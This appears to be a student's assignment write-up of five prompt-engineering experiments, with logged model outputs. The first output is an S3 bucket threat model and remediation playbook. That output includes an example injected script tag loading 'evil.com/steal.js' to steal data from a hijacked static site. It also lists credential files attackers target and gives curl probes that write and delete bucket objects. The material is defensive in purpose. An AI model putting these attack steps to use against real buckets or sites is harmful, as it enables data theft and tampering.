# 🧪 Prompt Engineering Experiments

### Assignment 4 — Visibility Bots Innovation Lab · Fellowship Week 1

**Author:** Rana Muhammad Haseeb Khan · **Track 2: NLP & AI Agents**

All five experiments below were run **live** through my **AI Workspace** app (Assignment 3) against the **OpenRouter API**. Each experiment documents the **Prompt**, the real **Output**, my **Observations**, and concrete **Improvements**.

| # | Technique | Core idea |
|---|-----------|-----------|
| 1 | **Role Prompting** | Assign the model an expert persona to change depth, structure, and register |
| 2 | **Chain-of-Thought** | Force visible step-by-step reasoning for multi-step problems |
| 3 | **Few-Shot** | Teach the label set and output format through examples |
| 4 | **Structured Output (JSON)** | Constrain output to a machine-readable, typed schema |
| 5 | **Prompt Optimization** | Refine a vague prompt into a precise, production-grade instruction |

---

## 🎭 Experiment 1 — Role Prompting

**Technique:** A system persona is assigned so the model responds *as a domain expert* rather than a general assistant. The same question, asked without a role, returns a short generic list; with an expert role it returns a full structured threat model.

### Prompt

**System Prompt (Persona):**
> *"You are a Senior Cloud Security Engineer and Lead Penetration Tester specialized in cloud-native architectures. Answer with rigorous technical precision — include CVSS risk ratings, exploitation mechanics (exact API actions), remediation steps, and validation checks."*

**User Prompt:**
> What are the immediate structural risks of leaving an Amazon S3 bucket exposed with read/write public permissions?

### Output *(cleaned & formatted; content preserved)*

**Executive Summary — Overall Risk Rating: `CRITICAL` (CVSS 3.1 Base 9.8–10.0).**
An S3 bucket with `PublicRead` + `PublicWrite` (AllUsers/AuthenticatedUsers ACLs or bucket policy) represents a **total loss of control over the storage plane** — not a misconfiguration but an open vulnerability weaponized by automated scanners within minutes.

**1. Data Integrity & Confidentiality Risks (Critical)**

| Risk Vector | Technical Mechanism | Impact |
|---|---|---|
| Data Exfiltration | `ListObjectsV2` + `GetObject` via unsigned HTTP (no IAM creds) | Total PII/PCI/PHI leakage; indexed by `s3scanner`, `bucket_finder`, Grayhat Warfare |
| Data Destruction / Wiper | `DeleteObject`, `DeleteObjects`, `PutBucketLifecycle` | Ransomware without encryption; recovery impossible without CRR / immutable backups |
| Data Poisoning | `PutObject` overwriting keys; injecting webshells / supply-chain artifacts | Stored XSS (static assets) or Build-Pipeline Hijack / RCE (CI/CD, Terraform state, images) |
| Metadata Manipulation | `PutObjectTagging`, `PutObjectLegalHold`, `PutObjectRetention` | Compliance evasion / legal-hold bypass |

**2. Compute & Financial Exhaustion Risks (High → Critical)**

| Risk Vector | Technical Mechanism | Impact |
|---|---|---|
| Unbounded Storage Costs | `PutObject` loops — 5 TB multipart or millions of small objects | Financial DoS (~$600/day at 1 Gbps); **no native max-bucket-size quota** |
| Request Cost Amplification | `ListObjectsV2`, `GetObject` egress, `HEAD` floods | Egress bill attack ($0.09/GB egress) |
| Malware Hosting / CDN Abuse | `PutObject` + `Content-Type` + Public Read (C2 / phishing kit host) | AWS account suspension (AUP); detected by GuardDuty S3 Protection |
| Cryptojacking via Triggers | `PutObject` → `s3:ObjectCreated:*` → Lambda / SQS / SNS / EventBridge | Compute hijack; exhaust Lambda concurrency/timeout budgets |

**3. Attack-Chain Escalation / Lateral Movement (Critical)**

| Vector | Prerequisite | Escalation Path |
|---|---|---|
| IAM Credential Theft | Bucket holds `.aws/credentials`, `.env`, `id_rsa`, `terraform.tfstate`, `kubeconfig` | **Full account takeover** via `sts:AssumeRole` pivot |
| IaC State Poisoning | Bucket stores `terraform.tfstate` / CloudFormation templates | Infra injection — `terraform apply` provisions attacker resources |
| Static Site / SPA Hijack | Static Website Hosting enabled | Persistent client-side attack — inject `<script src="evil.com/steal.js">` |
| Log Injection / SIEM Poisoning | Bucket targets VPC Flow / CloudTrail / ALB / WAF logs | Observability blindness; cost explosion + alert fatigue |

**4. Regulatory & Legal Liability (Critical)**

| Framework | Violation | Consequence |
|---|---|---|
| GDPR (Art. 32/33) | Public write = unauthorized modification; read = disclosure | €20M / 4% global turnover; 72-hour breach notification |
| HIPAA (45 CFR §164.312) | ePHI impermissible disclosure | Tier-4 penalty $1.9M/violation/yr; criminal liability |
| PCI DSS v4.0 (3.4/3.5/4.1) | PAN exposure; skimmer injection | Revocation of AoC; $5k–$100k/month fines |
| SEC / SOX | Financial-reporting integrity compromised | Material-weakness disclosure; executive liability |

**5. Structural Architecture Weaknesses Exposed**
- **No `PublicAccessBlock`:** `BlockPublicAcls / IgnorePublicAcls / BlockPublicPolicy / RestrictPublicBuckets` all `false`; not enforced via SCP.
- **Missing bucket-policy conditions:** no `aws:SecureTransport` (allows HTTP), no SSE enforcement, no `aws:SourceVpce`.
- **No Object Lock / Versioning strategy:** overwrite/delete irreversible without Compliance-Mode Object Lock + MFA Delete.
- **No Data Perimeter:** non-admin roles can flip the bucket public — no `Deny` on `PutBucketPolicy` / `PutBucketAcl` / `PutPublicAccessBlock`.

**Immediate Remediation Playbook (T-0 → T+1h)**

| Phase | Action | Command (abridged) |
|---|---|---|
| 1. Contain (T+0) | Enable Block Public Access | `aws s3control put-public-access-block --account-id $ACCT --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true` |
| 2. Freeze (T+5m) | Deny-all bucket policy except trusted roles | `aws s3api put-bucket-policy --bucket $BUCKET --policy '{...Deny...}'` |
| 3. Assess Blast Radius (T+15m) | Enable CloudTrail Data Events; query anonymous access | `aws cloudtrail lookup-events --lookup-attributes AttributeKey=ResourceName,AttributeValue=$BUCKET` |
| 4. Forensics (T+30m) | S3 Inventory / list unauthorized versions | `aws s3api list-object-versions --bucket $BUCKET` |
| 5. Recover (T+45m) | Restore from Versioning / CRR replica | `aws s3api copy-object --copy-source $BUCKET/$KEY?versionId=$PREV` |
| 6. Harden (T+60m+) | SCP deny public-access changes; enforce TLS/SSE; Object Lock | `aws organizations create-policy ...` |

**Penetration-Tester Validation Checklist** — each must return `403 / AccessDenied` from an unauthenticated external IP:
```bash
curl -I  http://$BUCKET.s3.amazonaws.com/                 # List
curl -I  http://$BUCKET.s3.amazonaws.com/known-object.txt # Read
curl -X PUT -d "malware" http://$BUCKET.s3.amazonaws.com/evil.sh   # Write
curl -X DELETE http://$BUCKET.s3.amazonaws.com/known-object.txt    # Delete
aws s3api get-bucket-policy --bucket $BUCKET --no-sign-request     # Policy read
aws s3api get-bucket-acl    --bucket $BUCKET --no-sign-request     # ACL read
```

### Observations
- The persona didn't just change *tone* — it changed **structure and content**. The answer follows a real security-report shape: Executive Summary → CVSS rating → risk taxonomy → remediation playbook → validation checklist.
- It surfaced **non-obvious attack chains** a generic answer would miss: `terraform.tfstate` → account takeover, and event-notifications → Lambda cryptojacking.
- Register matched the role precisely — exact API actions (`ListObjectsV2`, `DeleteObjects`), dollar figures, and compliance clauses (GDPR Art. 32, HIPAA §164.312).

### Improvements
- Add a **scope/length constraint** (*"top 5 risks only"* or *"a one-page exec brief"*) — an expert persona tends toward exhaustive verbosity.
- Narrow to **one compliance framework** (e.g., *"focus on PCI DSS"*) when relevant, to avoid spreading thin.
- Require *"cite the exact AWS doc/control for each remediation"* to force verifiable references.
- Pair with **structured output** (a JSON risk register) so the analysis feeds automation, not just human reading.

---

## 🧠 Experiment 2 — Chain-of-Thought (CoT) Prompting

**Technique:** Asking the model to *"think step-by-step"* forces it to externalize intermediate computation, which improves accuracy on multi-step problems and makes any error auditable.

### Prompt
> A logistics facility processes smart automation requests.
> Pack A takes **4 min** to clean and **8 min** to run through an AI sorting agent.
> Pack B takes **3 min** to clean and **12 min** to run through an AI sorting agent.
> If the facility has **3 Pack A** and **2 Pack B** items, how long to clean and sort all items **sequentially**?
> **Let's think step-by-step to compute the exact time allocation breakdown.**

### Output

**1. Time per item type**
- Pack A: 4 + 8 = **12 min** each → 3 × 12 = **36 min**
- Pack B: 3 + 12 = **15 min** each → 2 × 15 = **30 min**

**2. Verification by stage**

| Stage | Item | Qty | Unit | Total |
|---|---|---|---|---|
| Cleaning | Pack A | 3 | 4 min | 12 min |
| Cleaning | Pack B | 2 | 3 min | 6 min |
| **Cleaning Subtotal** | | | | **18 min** |
| AI Sorting | Pack A | 3 | 8 min | 24 min |
| AI Sorting | Pack B | 2 | 12 min | 24 min |
| **Sorting Subtotal** | | | | **48 min** |
| **GRAND TOTAL** | | | | **66 minutes** |

**Answer: 66 minutes (1 h 6 m).**
> *Note:* assumes a single processing thread (no overlap). With separate parallel Cleaning/Sorting stations (pipelining), the makespan would be ~54 min — but *"sequentially"* implies no overlap.

### Observations
- CoT reached the correct **66 minutes** and, crucially, **cross-verified** it two ways (per-item totals *and* per-stage subtotals) — the two paths agreeing is a built-in self-check.
- The model **caught an ambiguity** in the question (sequential vs. pipelined stations) and explicitly stated its assumption, even computing the alternative (~54 min). A "just give the number" prompt would have hidden this.
- Forcing linear token generation eliminated the arithmetic hallucinations that direct-answer prompts are prone to on multi-stage sums.

### Improvements
- Append a machine-parseable final line (*"end with `FINAL: <minutes>`"*) so downstream code can extract the answer reliably.
- Ask it to **state assumptions first, then compute** — front-loading assumptions makes the reasoning easier to validate.
- For the parallel case, request **both interpretations side-by-side in a table** to make the modeling choice explicit.

---

## 📚 Experiment 3 — Few-Shot Prompting

**Technique:** A few input→output demonstrations teach the model both the **output format** (bracketed `UPPER_SNAKE_CASE` tags) and the **classification style**, so it generalizes to a new, unseen input.

### Prompt
> Analyze user feedback logs regarding automated software features and map them cleanly to standardized technical sentiments.
>
> Input: *The UI agent responds too slowly and lags out when loading our data logs.* → `[PERFORMANCE_BOT_LATENCY_HIGH]`
> Input: *The workflow engine triggered an unintended email loop to our customer base.* → `[EXECUTION_LOGIC_FAULT]`
> Input: *I love the new dark theme dashboard layout, it makes tracking data a breeze.* → `[USER_EXPERIENCE_POSITIVE]`
> Input: *The system fails to parse my security key every time I try to run a task.* → **Output:**

### Output
```
[AUTHENTICATION_PARSING_FAULT]
```

### Observations
- With only three examples, the model inferred the **naming convention** (`[DOMAIN_SUBJECT_STATE]`) and produced a brand-new, unlisted tag — `[AUTHENTICATION_PARSING_FAULT]` — that fits the established pattern perfectly (*parse* + *security key* → authentication + parsing fault).
- **Format discipline** was flawless: exactly one bracketed tag, no conversational text, nothing to strip — immediately usable as a label in a pipeline.

### Improvements
- If downstream systems expect a **fixed enum**, provide a *closed label set* — the model's ability to invent plausible new tags is powerful for discovery but risky when the schema must be stable.
- Add an **ambiguous / mixed example** (e.g., billing + technical) to teach precedence rules.
- Combine with structured output for confidence: `→ {"tag": "AUTHENTICATION_PARSING_FAULT", "confidence": 0.93}`.

---

## 📦 Experiment 4 — Structured Output (JSON)

**Technique:** An explicit schema plus a *"strictly as a validated JSON object"* instruction forces the model to emit typed, machine-readable output — the backbone of tool-calling and data pipelines.

### Prompt
> Extract the configuration parameters from the following technical request. Output your final response strictly as a validated JSON object matching this schema:
> `{ "project_name": string, "preferred_models": array of strings, "estimated_hours": integer }`
>
> **Text Request:** *"We need to kick off project OptiRoute AI next week. We want to test it against gpt-4o and llama-3-8b. Our current timeline budget looks like it will take around 45 developer hours to finish up."*

### Output
```json
{
  "project_name": "OptiRoute AI",
  "preferred_models": ["gpt-4o", "llama-3-8b"],
  "estimated_hours": 45
}
```

### Observations
- The output is **clean, valid JSON** — no markdown fences, no prose — so it parses on the first `JSON.parse()` / `json.loads()`.
- **Type fidelity** was respected: `estimated_hours` is the integer `45`, not the string `"45"`, because the schema said `integer`; and `preferred_models` is a proper array parsed out of the sentence *"gpt-4o and llama-3-8b."*
- Natural-language noise (*"around", "developer hours"*) was correctly stripped down to the numeric value.

### Improvements
- Don't rely on the instruction alone — enforce with the API's **`response_format` / JSON-schema / tool-calling** so validity is guaranteed at decode time, not just requested.
- Validate the parsed object against a **Pydantic (Python)** or **Zod (TS)** model with `additionalProperties: false` and `required` fields to prevent type-casting failures.
- Define behavior for **missing data** (e.g., emit `null`) so partial inputs don't cause hallucinated values.

---

## ✨ Experiment 5 — Prompt Optimization

**Technique:** The same intent is expressed twice — once vaguely, once with a **role + hard constraints** — to show how precision collapses a sprawling generic answer into a focused, production-grade deliverable.

### Prompt A — Vague
> Tell me how to write an API route in Node.js.

### Output A *(abridged — the full response was ~2,000 words)*
A sprawling, tutorial-style answer covering **four different approaches**, ranked by popularity:
1. **Express.js** — full server with GET/POST, URL params, query params, global error handler.
2. **Fastify** — schema-validated routes.
3. **Native `node:http`** — manual routing/parsing.
4. **Edge frameworks (Hono / Elysia)**.

…plus a 7-row **Best-Practices checklist** (env vars, validation, logging, security headers, rate limiting) and a *"which one should you choose?"* decision guide.

> Technically correct and thorough — but it's **documentation, not a deliverable**. It chooses nothing, ships nothing, and buries the answer in options.
> ⏱️ 39.07s · 🔌 OpenRouter · 🎯 `nvidia/nemotron-3-ultra-550b-a55b:free`

### Prompt B — Optimized
> **System Prompt:** *"You are a Senior Backend Engineer. Output clean, modular, production-ready code with no conversational filler."*

### Output B *(abridged — full response shipped a complete modular codebase)*
A single **opinionated, production Fastify + Zod + TypeScript** project — no framework comparison, no prose, just architecture:

```
src/
├── app.ts                  # App factory (composition root)
├── server.ts               # Entry point + graceful shutdown
├── config/index.ts         # Zod-validated env config
├── plugins/                # helmet, cors, rate-limit, swagger
├── modules/users/          # route · schema · service · repository
├── shared/
│   ├── errors/             # AppError, NotFoundError
│   ├── hooks/errorHandler  # centralized error handler
│   └── utils/logger.ts     # Pino instance (with secret redaction)
└── types/fastify.d.ts
```

Representative slices from the output:

```ts
// src/config/index.ts — validated env; app crashes fast on bad config
export const config = envSchema.parse(process.env);

// src/shared/errors/AppError.ts — operational vs programmer errors
export class AppError extends Error {
  constructor(message: string, public statusCode: number, public code: string, public details?: unknown) {
    super(message);
    Error.captureStackTrace(this, this.constructor);
  }
}

// src/modules/users/users.service.ts — business rules, throws typed errors
async create(body: CreateUserBody) {
  if (await usersRepository.findByEmail(body.email))
    throw new AppError('Email already in use', 409, 'EMAIL_CONFLICT');
  return usersRepository.create(body);
}
```

Plus **layered separation** (route → service → repository), **Zod as single source of truth** for validation *and* types, structured **Pino** logging with secret redaction, **Helmet / CORS / rate-limit** defaults, and **graceful SIGTERM/SIGINT shutdown** — closing with a "Key Architectural Decisions" rationale.

### Observations
- The vague prompt maximized **breadth** (four frameworks, generic checklist); the optimized prompt maximized **depth and usability** (one coherent, shippable codebase).
- Two constraints did the heavy lifting: *"no conversational filler"* removed all meta-explanation, and *"modular, production-ready"* steered the model from snippets toward **architecture** (composition root, error hierarchy, repo/service split).
- The role (*"Senior Backend Engineer"*) set the quality bar — it independently added redacted logging, security headers, and graceful shutdown that were never asked for but are expected of that role.

### Improvements
- Add explicit **scope** (*"just the users module"*) to bound output size — the model still produced an entire boilerplate.
- **Name the framework** (e.g., Express or Fastify) if you have a preference; otherwise the model picks for you.
- Add a **format constraint** (*"one file per code block, no text between blocks"*) for clean copy-paste / automated extraction.
- Require an explicit validation library (**Zod / Joi**) in the prompt to guarantee enterprise-grade input handling in the generated code.

---

## 🎯 Summary

| Experiment | Weak / baseline version | Strong version | Key lever |
|---|---|---|---|
| 1 · Role Prompting | generic 3-point risk list | CVSS-scored threat model + IR playbook | **persona / authority** |
| 2 · Chain-of-Thought | opaque single number | staged, self-verified `66 min` | **visible reasoning** |
| 3 · Few-Shot | inconsistent free-text label | one clean, pattern-matched tag | **format by example** |
| 4 · Structured Output | prose with markdown wrappers | valid, typed JSON | **schema + validation** |
| 5 · Optimization | 4-framework tutorial | one production codebase | **role + constraints** |

**Takeaway:** every technique is a different way of **removing ambiguity** — telling the model *who to be* (role), *how to think* (CoT), *what shape to produce* (few-shot & JSON), and *what constraints to honour* (optimization). Applied together, they convert a general chat model into a **reliable, production-grade component**.

---

*Experiments conducted by Rana Muhammad Haseeb Khan via the AI Workspace app · Visibility Bots Fellowship — 2026.*
